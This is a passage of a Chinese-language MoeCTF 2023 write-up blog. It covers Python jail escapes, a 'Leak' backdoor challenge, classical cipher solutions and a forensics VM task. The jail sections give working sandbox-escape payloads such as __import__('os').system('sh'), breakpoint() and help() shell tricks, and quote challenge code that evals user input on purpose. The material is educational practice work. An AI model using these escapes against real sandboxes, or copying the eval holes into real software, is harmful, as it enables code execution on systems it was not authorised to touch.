phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 你知道什么是 欧拉函数吗 [1]</span>
d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span> <span class="token comment"># 什么是乘法逆元？ [2]</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="baby-e"><a href="#baby-e" class="headerlink" title="baby_e"></a>baby_e</h2><h1 id="Jail"><a href="#Jail" class="headerlink" title="Jail"></a>Jail</h1><p>jail挺好玩的，思路开阔了很多</p>
<p>参考的这个文章学习的<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578966149">https://zhuanlan.zhihu.com/p/578966149</a></p>
<h2 id="Jail-lavel-0"><a href="#Jail-lavel-0" class="headerlink" title="Jail lavel 0"></a>Jail lavel 0</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>
user_input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'calc Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以用__ import __来导入os模块使用system来执行系统命令,import魔术方法使用import导入模块的时候，会调用import魔术方法。import魔术方法可以用来动调加载模块</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>flag{0dAAkA3NNdFaoIDhHrqY35M60amn3_Cs}</p>
<h2 id="Jail-lavel-1"><a href="#Jail-lavel-1" class="headerlink" title="Jail lavel 1"></a>Jail lavel 1</h2><p>这里多了个长度限制，lv0的payload用不了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the MoeCTF2023 Jail challenge level1.It's time to work on this calc challenge."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>
user_input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker! Bye~"</span><span class="token punctuation">)</span>
  exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'calc Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>网上搜到有个思路是二次传参，exec(input())但是超了一个字符</p>
<p>有个breakpoint()函数，可以打开一个叫pdb(python debugger)的调试器，这个调试器可以执行python代码，还有打断点调试代码</p>
<p>进入后用第一题的__ import __ (‘os’).system(‘sh’)就能打开一个终端，然后 cat flag拿到flag</p>
<p>flag{Wk1Sp0Q4gA6at3kySUmJhtdZq_AitxwJ}</p>
<h2 id="Jail-lavel-2"><a href="#Jail-lavel-2" class="headerlink" title="Jail lavel 2"></a>Jail lavel 2</h2><p>这里加了个长度限制</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the MoeCTF2023 Jail challenge level1.It's time to work on this calc challenge."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>
user_input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker! Bye~"</span><span class="token punctuation">)</span>
  exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'calc Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以使用help()函数 查看sys模块，sys模块下有个: 可以传递参数过去当shell命令执行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">help<span class="token punctuation">(</span><span class="token punctuation">)</span>
sys
<span class="token operator">!</span>
<span class="token function">cat</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag{iQR2CFeLlJ8Hi8ydPGs-HVHXSmGiQxwP}</p>
<h2 id="Jail-Level-3-未解决"><a href="#Jail-Level-3-未解决" class="headerlink" title="Jail Level 3 [未解决]"></a>Jail Level 3 [未解决]</h2><p>长度不超过12 且不可用breakpoint ,hint中help被禁用</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">import</span> re
BANLIST <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'breakpoint'</span><span class="token punctuation">]</span>
BANLIST_WORDS <span class="token operator">=</span> <span class="token string">'|'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>WORD<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span> <span class="token keyword">for</span> WORD <span class="token keyword">in</span> BANLIST<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>
user_input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker! Bye~"</span><span class="token punctuation">)</span>
  exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>BANLIST_WORDS<span class="token punctuation">,</span> user_input_data<span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Blacklisted word detected! you are hacker!'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer result: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Jail-Level-4"><a href="#Jail-Level-4" class="headerlink" title="Jail Level 4"></a>Jail Level 4</h2><p>是一个不断循环 的eval(input)，python2.7环境的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>拿到flag flag{MvhG6P0cpa4yavJzq6gcJAYgGfNSi5yZ}</p>
<h2 id="Leak-Leval-0"><a href="#Leak-Leval-0" class="headerlink" title="Leak Leval 0"></a>Leak Leval 0</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">fake_key_into_local_but_valid_key_into_remote <span class="token operator">=</span> <span class="token string">"moectfisbestctfhopeyoulikethat"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hey Guys,Welcome to the moeleak challenge.Have fun!."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"| Options: | [V] uln | [B] ackdoor "</span><span class="token punctuation">)</span>
        <span class="token keyword">def</span> <span class="token function">func_filter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        not_allowed <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'vvvveeee'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> not_allowed
            <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            challenge_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> challenge_choice <span class="token operator">==</span> <span class="token string">'v'</span><span class="token punctuation">:</span>
        code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code >> "</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"you're hacker!"</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">if</span> func_filter<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker! byte~"</span><span class="token punctuation">)</span> exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">elif</span> challenge_choice <span class="token operator">==</span> <span class="token string">'b'</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Please enter the admin key"</span><span class="token punctuation">)</span> key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"key >> "</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> fake_key_into_local_but_valid_key_into_remote<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hey Admin,please input your code:"</span><span class="token punctuation">)</span>
        code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"backdoor >> "</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span> <span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You should select valid choice!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>vuln 9的长度可以用globals() 将真正的key给找出来，然后用backdoor执行代码</p>
<pre class="line-numbers language-none"><code class="language-none">globals() #找到了key &#39;key_6366a131649a4e9b&#39;: &#39;4e86eda06366a131649a4e9be1a9f217&#39;
4e86eda06366a131649a4e9be1a9f217
__import__(&#39;os&#39;).system(&#39;sh&#39;)
cat flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag&#123;GjyJBWFLfQoLO8qiZpIMjKQEjl-MBKnq&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>





<h1 id="Classical-Crypto"><a href="#Classical-Crypto" class="headerlink" title="Classical Crypto"></a>Classical Crypto</h1><h2 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h2><pre class="line-numbers language-none"><code class="language-none">@64E7LC@Ecf0:D0;FDE020D:&gt;!&#x3D;60&#x3D;6EE6C0DF3DE:EFE:@?04:!96C0tsAJdEA6d;F&#125;%0N<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查询了一下rot编码的原理，原理是将字符的ascii往前推</p>
<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a> 使用这里的rot47拿到flag，少了个m需要补充一下</p>
<pre class="line-numbers language-none"><code class="language-none">moectf&#123;rot47_is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT_&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h2><p>搜索围墙这个词，搜到了栅栏密码</p>
<pre class="line-numbers language-none"><code class="language-none">mt3_hsTal3yGnM_p3jocfFn3cp3_hFs3c_3TrB__i3_uBro_lcsOp&#125;e&#123;ciri_hT_avn3Fa_j<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=777">http://www.atoolbox.net/Tool.php?Id=777</a> 在线解密</p>
<pre class="line-numbers language-none"><code class="language-none">moectf&#123;F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h2><p>观察长度，字符结构，像是将每个字符的ascii偏移n位，搜索到了凯撒密码</p>
<pre class="line-numbers language-none"><code class="language-none">tvljam&#123;JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://www.lddgo.net/encrypt/caesar-cipher">https://www.lddgo.net/encrypt/caesar-cipher</a> 偏移7</p>
<pre class="line-numbers language-none"><code class="language-none">moectf&#123;CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="不是“皇帝的新密码”"><a href="#不是“皇帝的新密码”" class="headerlink" title="不是“皇帝的新密码”"></a>不是“皇帝的新密码”</h2><p>这个题好坑啊，这里这个md5是key的md5，不是flag的md5，但是上面写着md5 of flag，我解了半天出不来，想来想去也不是代码逻辑有问题，弄了几组数据进去，脚本都没有问题。</p>
<p>密文看起来像是每位都偏移了n位，明文前六位是moectf，然后跑了一下脚本发现每位偏移都不太一样，也没有什么规律。后面发现是维吉尼亚密码</p>
<pre class="line-numbers language-none"><code class="language-none">scsfct&#123;wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn&#125;

md5 of flag (utf-8) &#96;ea23f80270bdd96b5fcd213cae68eea5&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>网上查询到，维吉尼亚密码首先要确定key的长度，算出来是7，然后前六位moectf算出前六位key，爆破第七位和md5比较拿到key解密flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib

<span class="token keyword">def</span> <span class="token function">virginiaCrack</span><span class="token punctuation">(</span>cipherText<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 解密函数</span>
    length <span class="token operator">=</span> getKeyLen<span class="token punctuation">(</span>cipherText<span class="token punctuation">)</span> <span class="token comment">#得到密钥长度</span>
    <span class="token comment"># key = getKey(cipherText,length) #找到密钥</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">:</span>
        key <span class="token operator">=</span> <span class="token string">"moectf"</span> <span class="token operator">+</span> i
        keyStr <span class="token operator">=</span> <span class="token string">''</span>
        <span class="token keyword">for</span> k <span class="token keyword">in</span> key<span class="token punctuation">:</span>
            keyStr<span class="token operator">+=</span>k
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'the key:'</span><span class="token punctuation">,</span>keyStr<span class="token punctuation">)</span>
        plainText <span class="token operator">=</span> <span class="token string">''</span>
        index <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> ch <span class="token keyword">in</span> cipherText<span class="token punctuation">:</span>
                c <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>index<span class="token operator">%</span>length<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span>
                plainText <span class="token operator">+=</span> c
                index<span class="token operator">+=</span><span class="token number">1</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>plainText<span class="token punctuation">)</span>
        <span class="token keyword">return</span> plainText

<span class="token comment"># 根据明文和密文偏移关系求前面的key</span>
<span class="token keyword">def</span> <span class="token function">vigenere_key</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> ciphertext<span class="token punctuation">)</span><span class="token punctuation">:</span>
    alphabet <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span>
    key <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> p<span class="token punctuation">,</span> c <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> ciphertext<span class="token punctuation">)</span><span class="token punctuation">:</span>
        p_idx <span class="token operator">=</span> alphabet<span class="token punctuation">.</span>index<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
        c_idx <span class="token operator">=</span> alphabet<span class="token punctuation">.</span>index<span class="token punctuation">(</span>c<span class="token punctuation">)</span>

        k_idx <span class="token operator">=</span> <span class="token punctuation">(</span>c_idx <span class="token operator">-</span> p_idx<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span>
        key <span class="token operator">+=</span> alphabet<span class="token punctuation">[</span>k_idx<span class="token punctuation">]</span>
    <span class="token keyword">return</span> key

<span class="token comment">#解密</span>
<span class="token keyword">def</span> <span class="token function">vigenere_decrypt_extended</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    alphabet <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span>
    plaintext <span class="token operator">=</span> <span class="token string">''</span>

    key <span class="token operator">=</span> key<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    key_expanded <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">]</span>
    key_index <span class="token operator">=</span> <span class="token number">0</span>

    <span class="token keyword">for</span> c <span class="token keyword">in</span> ciphertext<span class="token punctuation">:</span>
        <span class="token keyword">if</span> c <span class="token keyword">in</span> alphabet<span class="token punctuation">:</span>
            k <span class="token operator">=</span> key_expanded<span class="token punctuation">[</span>key_index<span class="token punctuation">]</span>
            c_idx <span class="token operator">=</span> alphabet<span class="token punctuation">.</span>index<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
            k_idx <span class="token operator">=</span> alphabet<span class="token punctuation">.</span>index<span class="token punctuation">(</span>k<span class="token punctuation">)</span>

            p_idx <span class="token operator">=</span> <span class="token punctuation">(</span>c_idx <span class="token operator">-</span> k_idx<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span>
            plaintext <span class="token operator">+=</span> alphabet<span class="token punctuation">[</span>p_idx<span class="token punctuation">]</span>

            key_index <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            plaintext <span class="token operator">+=</span> c

    <span class="token keyword">return</span> plaintext

<span class="token keyword">def</span> <span class="token function">md5_hash</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

plaintext_prefix <span class="token operator">=</span> <span class="token string">"moectf"</span>
ciphertext_prefix <span class="token operator">=</span> <span class="token string">"scsfct"</span>
md5_target <span class="token operator">=</span> <span class="token string">"ea23f80270bdd96b5fcd213cae68eea5"</span>
ciphertext <span class="token operator">=</span> <span class="token string">"scsfct&#123;wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn&#125;"</span>

<span class="token comment">#前六位key</span>
key_prefix <span class="token operator">=</span> vigenere_key<span class="token punctuation">(</span>plaintext_prefix<span class="token punctuation">,</span> ciphertext_prefix<span class="token punctuation">)</span>

<span class="token comment">#爆破第七位key</span>
key_candidates <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
<span class="token keyword">for</span> candidate <span class="token keyword">in</span> key_candidates<span class="token punctuation">:</span>
    test_key <span class="token operator">=</span> key_prefix <span class="token operator">+</span> candidate
    decrypted_text <span class="token operator">=</span> vigenere_decrypt_extended<span class="token punctuation">(</span>ciphertext_prefix<span class="token punctuation">,</span> test_key<span class="token punctuation">)</span>
    <span class="token keyword">if</span> md5_hash<span class="token punctuation">(</span>decrypted_text<span class="token punctuation">)</span> <span class="token operator">==</span> md5_target<span class="token punctuation">:</span>
        <span class="token keyword">break</span>

<span class="token comment">#解密</span>
ciphertext_lower <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
decrypted_text_full <span class="token operator">=</span> vigenere_decrypt_extended<span class="token punctuation">(</span>ciphertext_lower<span class="token punctuation">,</span> test_key<span class="token punctuation">)</span>
decrypted_text_restored <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>decrypted_text_full<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> decrypted_text_full<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i<span class="token punctuation">,</span> c <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>decrypted_text_restored<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">moectf&#123;vIgENErE_CIphEr_Is_a_lIttlE_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>





<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h1 id="ai"><a href="#ai" class="headerlink" title="ai"></a>ai</h1><h2 id="AI入门指北"><a href="#AI入门指北" class="headerlink" title="AI入门指北"></a>AI入门指北</h2><p>在这找到不带gpu版本的安装命令 <a target="_blank" rel="noopener" href="https://pytorch.org/">https://pytorch.org/</a></p>
<pre class="line-numbers language-none"><code class="language-none">moectf&#123;install_torch_torchvision_torchaudio&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="随身携带的虚拟机"><a href="#随身携带的虚拟机" class="headerlink" title="随身携带的虚拟机"></a>随身携带的虚拟机</h2><p>校园网好卡，附件下载了半天，解压后发现全是vmdk的文件</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jcjic/article/details/118241188">https://blog.csdn.net/jcjic/article/details/118241188</a> 根据这篇文章创建了一个win10虚拟机然后导入vmdk进入了系统</p>
<p>发现有一个磁盘被bitlook锁住了，然后在回收站这发现了这个文件</p>
<pre class="line-numbers language-none"><code class="language-none">BitLocker Drive Encryption recovery key 

To verify that this is the correct recovery key, compare the start of the following identifier with the identifier value displayed on your PC.

Identifier:

	4DFEE901-55AC-43EB-96F4-FFE09609952A

If the above identifier matches the one displayed by your PC, then use the following key to unlock your drive.

Recovery Key:

	702801-061622-323125-555819-258544-713713-089331-406373

If the above identifier doesn&#39;t match the one displayed by your PC, then this isn&#39;t the right key to unlock your drive.
Try another recovery key, or refer to https:&#x2F;&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;260589 for additional assistance.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>解锁磁盘后发现flag.txt</p>
<pre class="line-numbers language-none"><code class="language-none">bW9lY3Rme0JhczFjX0QxNWtfRjByM25zMWNzIX0&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

